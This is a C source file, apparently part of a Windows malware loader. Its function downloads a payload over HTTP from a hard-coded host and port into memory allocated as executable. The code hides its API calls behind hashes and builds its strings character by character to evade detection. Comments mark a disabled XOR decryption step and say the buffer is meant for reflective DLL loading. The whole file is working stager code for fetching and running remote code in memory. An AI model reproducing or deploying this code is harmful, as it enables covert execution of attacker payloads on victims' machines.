#include "framework.h"
#include <winhttp.h>
#include "api_hash.h"
#include "headers.h"
#include "ldr.h"
#include "misc.h"

// ========== 函数指针类型 ==========
typedef HMODULE(WINAPI *fnLoadLibraryA)(LPCSTR);
typedef FARPROC(WINAPI *fnGetProcAddress)(HMODULE, LPCSTR);
typedef LPVOID HINTERNET;

// WinHTTP 函数指针
typedef HINTERNET(WINAPI *fnWinHttpOpen)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
typedef HINTERNET(WINAPI *fnWinHttpConnect)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
typedef HINTERNET(WINAPI *fnWinHttpOpenRequest)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR *, DWORD);
typedef BOOL(WINAPI *fnWinHttpSendRequest)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
typedef BOOL(WINAPI *fnWinHttpReceiveResponse)(HINTERNET, LPVOID);
typedef BOOL(WINAPI *fnWinHttpReadData)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI *fnWinHttpCloseHandle)(HINTERNET);
typedef BOOL(WINAPI *fnWinHttpQueryHeaders)(
    HINTERNET hRequest,
    DWORD dwInfoLevel,
    LPCWSTR pwszName,
    LPVOID lpBuffer,
    LPDWORD lpdwBufferLength,
    LPDWORD lpdwIndex);

LPVOID download_payload()
{
    // 1. 构造字符串
    CHAR sstr_winhttp[] = {'W', 'i', 'n', 'h', 't', 't', 'p', '.', 'd', 'l', 'l', '\0'};

    WCHAR str_host[] = {L'1', L'9', L'2', L'.', L'1', L'6', L'8', L'.', L'1', L'4', L'6', L'.', L'1', L'\0'};
    WCHAR str_path[] = {L'/', L'i', L'n', L's', L't', L'a', L'l', L'l', L'\0'};

    HMODULE hKernel32 = GMHR_Hash(HASH_KERNEL32);
    if (!hKernel32)
        return NULL;

    // 2. 加载 winhttp.dll
    HMODULE hWinHttp = GMHR_Hash(HASH_WINHTTP);
    if (!hWinHttp)
    {
        fnLoadLibraryA func_LoadLibraryA = NULL;
        if ((func_LoadLibraryA = (fnLoadLibraryA)GPAR_Hash(hKernel32, HASH_LOADLIBRARYA)) == NULL)
            return NULL;
        hWinHttp = func_LoadLibraryA(sstr_winhttp);
        if (!hWinHttp)
            return NULL;
    }

    // 3. 获取函数指针
    fnVirtualAlloc pVirtualAlloc = (fnVirtualAlloc)GPAR_Hash(hKernel32, HASH_VIRTUALALLOC);
    fnVirtualFree pVirtualFree = (fnVirtualFree)GPAR_Hash(hKernel32, HASH_VIRTUALFREE);

    fnWinHttpOpen pWinHttpOpen = (fnWinHttpOpen)GPAR_Hash(hWinHttp, HASH_WINHTTP_OPEN);
    fnWinHttpConnect pWinHttpConnect = (fnWinHttpConnect)GPAR_Hash(hWinHttp, HASH_WINHTTP_CONNECT);
    fnWinHttpOpenRequest pWinHttpOpenRequest = (fnWinHttpOpenRequest)GPAR_Hash(hWinHttp, HASH_WINHTTP_OPENREQUEST);
    fnWinHttpSendRequest pWinHttpSendRequest = (fnWinHttpSendRequest)GPAR_Hash(hWinHttp, HASH_WINHTTP_SENDREQUEST);
    fnWinHttpReceiveResponse pWinHttpReceiveResponse = (fnWinHttpReceiveResponse)GPAR_Hash(hWinHttp, HASH_WINHTTP_RECEIVERESP);
    fnWinHttpReadData pWinHttpReadData = (fnWinHttpReadData)GPAR_Hash(hWinHttp, HASH_WINHTTP_READDATA);
    fnWinHttpCloseHandle pWinHttpCloseHandle = (fnWinHttpCloseHandle)GPAR_Hash(hWinHttp, HASH_WINHTTP_CLOSEHANDLE);
    fnWinHttpQueryHeaders pWinHttpQueryHeaders = (fnWinHttpQueryHeaders)GPAR_Hash(hWinHttp, HASH_WINHTTP_QUERYHEADERS);
    if (!pWinHttpOpen || !pWinHttpConnect || !pWinHttpOpenRequest ||
        !pWinHttpSendRequest || !pWinHttpReceiveResponse || !pWinHttpReadData ||
        !pWinHttpCloseHandle || !pWinHttpQueryHeaders)
    {
        return NULL;
    }

    // 4. 初始化 WinHTTP
    HINTERNET hSession = pWinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, NULL, NULL, 0);
    if (!hSession)
        return NULL;

    HINTERNET hConnect = pWinHttpConnect(hSession, str_host, 9637, 0);
    if (!hConnect)
    {
        pWinHttpCloseHandle(hSession);
        return NULL;
    }

    WCHAR str_GET[] = {L'G', L'E', L'T', L'\0'};
    HINTERNET hRequest = pWinHttpOpenRequest(hConnect, str_GET, str_path, NULL, NULL, NULL, 0);
    if (!hRequest)
    {
        pWinHttpCloseHandle(hConnect);
        pWinHttpCloseHandle(hSession);
        return NULL;
    }

    // 5. 发送请求并接收响应
    if (!pWinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0))
    {
        pWinHttpCloseHandle(hRequest);
        pWinHttpCloseHandle(hConnect);
        pWinHttpCloseHandle(hSession);
        return NULL;
    }
    if (!pWinHttpReceiveResponse(hRequest, NULL))
    {
        pWinHttpCloseHandle(hRequest);
        pWinHttpCloseHandle(hConnect);
        pWinHttpCloseHandle(hSession);
        return NULL;
    }

    // 6. 读取数据
    DWORD dwDownloaded = 0;
    BYTE *buffer = NULL;
    DWORD totalSize = 0;

    // 尝试获取 Content-Length
    DWORD contentLength = 0;
    DWORD dwHeaderSize = sizeof(contentLength);
    if (pWinHttpQueryHeaders &&
        pWinHttpQueryHeaders(hRequest,
                             WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER,
                             WINHTTP_HEADER_NAME_BY_INDEX,
                             &contentLength,
                             &dwHeaderSize,
                             WINHTTP_NO_HEADER_INDEX))
    {
        // 已知总大小，一次性分配
        if (contentLength == 0)
            goto cleanup;
        buffer = (BYTE *)pVirtualAlloc(NULL, contentLength, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!buffer)
            goto cleanup;

        DWORD offset = 0;
        DWORD remaining = contentLength;
        DWORD dwDownloaded = 0;

        while (remaining > 0)
        {
            // 直接读取到 buffer + offset 处，读取大小不超过剩余量
            if (!pWinHttpReadData(hRequest, buffer + offset, remaining, &dwDownloaded))
                break;
            if (dwDownloaded == 0)
                break;
            offset += dwDownloaded;
            remaining -= dwDownloaded;
        }
        totalSize = offset;
    }

cleanup:
    // 关闭 WinHTTP 句柄
    pWinHttpCloseHandle(hRequest);
    pWinHttpCloseHandle(hConnect);
    pWinHttpCloseHandle(hSession);

    if (!buffer || totalSize == 0)
        return NULL;

    // 7. 解密（异或 0x53）
    // for (DWORD i = 0; i < totalSize; i++)
    //{
    //    buffer[i] ^= 0x53;
    //}

    // 8. 反射加载 DLL 并返回基地址
    return buffer;
}